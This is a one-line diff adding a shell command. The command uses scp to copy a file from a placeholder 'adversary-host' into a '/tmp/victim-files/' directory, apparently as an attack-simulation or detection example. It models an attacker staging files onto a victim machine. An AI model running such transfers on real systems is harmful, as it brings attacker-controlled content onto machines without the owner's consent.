@@ -1,0 +1,1 @@
+scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
